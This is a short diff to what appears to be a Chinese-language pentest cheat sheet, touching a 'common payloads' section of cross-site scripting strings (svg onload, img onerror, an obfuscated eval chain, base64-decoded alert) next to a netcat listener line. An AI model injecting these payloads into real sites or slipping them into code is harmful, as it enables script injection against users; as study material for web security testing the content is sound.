@@ -69,8 +69,8 @@ nc -lvp 8090
 **0x9:常用的payload**
 
 ```html
-svg/onload
-'-alert(1)-'
+svg/onload'-alert(1)-'
+<details/open/ontoggle="a=eval,b=alert,c=b`1`,a`b`">
 eval(atob('YWxlcnQoMSk='))
 <iMg SrC=x OnErRoR=alert(1)>
 <div onmouseover="alert('XSS');">
